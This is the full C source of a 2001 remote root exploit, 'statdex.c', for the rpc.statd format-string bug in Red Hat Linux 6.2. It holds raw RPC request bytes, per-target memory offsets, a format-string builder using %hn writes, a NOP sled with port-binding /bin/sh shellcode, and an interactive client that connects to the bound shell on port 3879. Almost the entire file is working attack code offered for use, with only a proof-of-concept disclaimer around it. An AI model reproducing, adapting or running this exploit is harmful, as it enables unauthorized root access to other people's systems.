/*
 * $Id: statdex.c,v 1.1.1.2 2004/04/17 09:30:08 bind Exp $
 * 
 * Description: Linux exploit for rpc.statd format string bug
 *
 * Author: bind (bind@gravitino.net)
 *
 * Details: A format string bug exists in the rpc.statd daemon
 * shipped with Redhat 6.2 & earlier.  The bug occurs due to 
 * the lack of handling format characters passed to the syslog() 
 * function.  Exploitation yields remote root access.
 *
 * Copyright (c) 2001 bind@gravitino.net All rights reserved.
 *
 * THIS IS PROOF OF CONCEPT SOFTWARE. IN NO EVENT SHALL THE AUTHOR BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
 * CONSEQUENTIAL DAMAGES RESULTING FROM THE USE OR MISUSE OF THIS SOFTWARE.
 *
 */

#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define max(a,b) ((a)>(b)?(a):(b))

char portmapper[] = 
  "\x46\x5e\x1b\x70\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86"
  "\xa0\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x86\xb8\x00"
  "\x00\x00\x01\x00\x00\x00\x11\x00\x00\x00\x00";

char statd[] = 
  "\x89\x01\x44\x4a\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86"
  "\xb8\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00"
  "\x00\x20\x3b\x77\xf1\x15\x00\x00\x00\x09\x6c\x6f\x63\x61\x6c"
  "\x68\x6f\x73\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

char shellcode[] = 
  "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d"
  "\xf8\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31"
  "\xc9\x89\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27"
  "\x89\x4d\xf0\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0"
  "\x8d\x4d\xf4\xcd\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd"
  "\x80\x89\xc3\x31\xc9\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd"
  "\x80\xeb\x18\x5e\x89\x75\x08\x31\xc0\x88\x46\x07\x89\x45\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4d\x08\x8d\x55\x0c\xcd\x80\xe8\xe3\xff"
  "\xff\xff/bin/sh";

int get_statd(char *);
int connect_statd(char *, int);
unsigned long resolve(char *);
int build_fmt(char *);
void shell(char *);

struct platform {
  char *name;
  unsigned short count;
  unsigned long dest_addr;
  unsigned long shell_addr;
};

struct platform targets[3] =
{
  { "Redhat Linux 6.2 booted", 20, 0xbffff140, 0xbffff474 },
  { "Redhat Linux 6.2 manual", 20, 0xbfffef30, 0xbffff290 },
  { NULL, 0, 0, 0 }
};

struct platform *target;

int main(int argc, char **argv)
{
  char *host;
  char sendbuf[sizeof(statd) + 999], fmtstr[999];
  int sockfd, port, i;
  unsigned long size;

  setvbuf(stdout, NULL, _IONBF, 0);

  if(argc < 2) {
    printf("Linux rpc.statd format string exploit by bind / 2001\n");
    printf("\nUsage: %s <victim> [target]\n"
           "\nTargets:\n", argv[0]);

    for(i = 0; targets[i].name != NULL; i++)
      printf("  [%d] - %s\n", i, targets[i].name);

    return(-1);
  }

  host = argv[1];

  i = 0;
  if(argc > 2)
    i = atoi(argv[2]);

  target = &targets[i];

  port = get_statd(host);
  if(port < 0) 
    exit(-1);

  sockfd = connect_statd(host, port);

  printf("\nExploiting %s.", target->name);
  build_fmt(fmtstr);
  size = htons(strlen(fmtstr));

  memcpy(sendbuf, statd, sizeof(statd));
  memcpy(sendbuf + sizeof(statd), &size, sizeof(size));
  memcpy(sendbuf + sizeof(statd) + 2, fmtstr, sizeof(fmtstr));
  write(sockfd, sendbuf, sizeof(sendbuf));
  close(sockfd);

  printf(".");
  sleep(2);
  printf(".");
  shell(host);

  return(0);
}

int get_statd(char *host)
{
  char recvbuf[1024];
  int sockfd, port, n;
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;
  sin.sin_port = htons(111);
  sin.sin_addr.s_addr = resolve(host);

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0) {
    puts("socket() failed");
    return(-1);
  }

  n = connect(sockfd, (struct sockaddr *)&sin, sizeof(sin));
  if(n < 0) {
    puts("connect() failed");
    return(-1);
  }

  write(sockfd, portmapper, sizeof(portmapper));
  n = read(sockfd, recvbuf, sizeof(recvbuf));

  memcpy(&port, &recvbuf[n - 2], 4);

  port = ntohs(port);
  if(!port) {  
    printf("Cannot find rpc.statd port\n"); 
    return(-1); 
  }

  close(sockfd);
  return(port);
}

int connect_statd(char *host, int port)
{
  int sockfd, n;
  struct sockaddr_in sin;

  sin.sin_family = AF_INET;  
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = resolve(host);

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);

  if(sockfd < 0) {
    puts("socket() failed");
    return(sockfd);
  }

  n = connect(sockfd, (struct sockaddr *)&sin, sizeof(sin));
  if(n < 0) {
    puts("connect() failed");
    return(-1);
  }
  return(sockfd);
}

int build_fmt(char *buf)
{
  char *p, evilcode[800];
  int x, len = 0;
  unsigned short low, high;
  unsigned long shell_addr[2], dest_addr[2];

  shell_addr[0] = (target->shell_addr & 0xffff0000) >> 16;
  shell_addr[1] = target->shell_addr & 0xffff;

  memset(buf, 0, sizeof(buf));

  for(x = 5; x < target->count; x++) {
    strcat(buf, "%8x");
    len += 8;
  }

  if (shell_addr[1] > shell_addr[0]) {
    dest_addr[0] = target->dest_addr + 2;
    dest_addr[1] = target->dest_addr;
    low  = shell_addr[0] - len + 6;
    high = shell_addr[1] - low - len + 6;
  } else { 
    dest_addr[0] = target->dest_addr;
    dest_addr[1] = target->dest_addr + 2;
    low  = shell_addr[1] - len + 6;
    high = shell_addr[0] - low - len + 6;
  }

  *(long *)&buf[0]  = 0x11111111;
  *(long *)&buf[4]  = dest_addr[0];
  *(long *)&buf[8]  = 0x11111111;
  *(long *)&buf[12] = dest_addr[1];

  p = buf + strlen(buf);
  sprintf(p, "%%%dd%%hn%%%dd%%hn", low, high);

  p = buf + strlen(buf);

  memset(evilcode, 0x90, sizeof(evilcode));
  memcpy(evilcode + 600, shellcode, sizeof(shellcode));

  strcat(p, evilcode); 

  return(0);
}

void shell(char *host)
{
  char buf[1024];
  fd_set fds;
  int sockfd, fmax, ret, n;
  struct sockaddr_in sin;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd < 0) {
    puts("socket() failed");
    return;
  }

  sin.sin_family = AF_INET;
  sin.sin_port = htons(3879);
  sin.sin_addr.s_addr = resolve(host);

  n = connect(sockfd, (struct sockaddr *)&sin, sizeof(sin));
  if(n < 0) {
    puts("failed");
    return;
  }

  puts("success!\n"); 

  fmax = max(fileno(stdin), sockfd) + 1;
  send(sockfd, "cat /etc/redhat-release;\r\nuname -a;\r\n", 37, 0);

  for(;;) {
    FD_ZERO(&fds);
    FD_SET(fileno(stdin), &fds);
    FD_SET(sockfd, &fds);

    if(select(fmax, &fds, NULL, NULL, NULL) < 0) {
      perror("select()");
      exit(-1);
    }

    if(FD_ISSET(sockfd, &fds)) {
      bzero(buf, sizeof buf);
      if((ret = recv(sockfd, buf, sizeof buf, 0)) < 0) {
        perror("recv()");
        close(sockfd);
        exit(-1);
      }
      if(!ret) {
        fprintf(stderr, "Connection closed\n");
        close(sockfd);
        exit(-1);
      }
      write(fileno(stdout), buf, ret);
    }

    if(FD_ISSET(fileno(stdin), &fds)) {
      bzero(buf, sizeof buf);
      ret = read(fileno(stdin), buf, sizeof buf);
      errno = 0;
      if(send(sockfd, buf, ret, 0) != ret) {
        if(errno) 
          perror("send()");
        else 
          fprintf(stderr, "Transmission loss\n");
        exit(-1);
      }
    }
  }
}

unsigned long resolve(char *hostname)
{
  struct sockaddr_in sin;
  struct hostent *hent;
  hent = gethostbyname(hostname);
  if(!hent)
    return 0;
  bzero((char *) &sin, sizeof(sin));
  memcpy((char *) &sin.sin_addr, hent->h_addr, hent->h_length);
  return sin.sin_addr.s_addr;
}

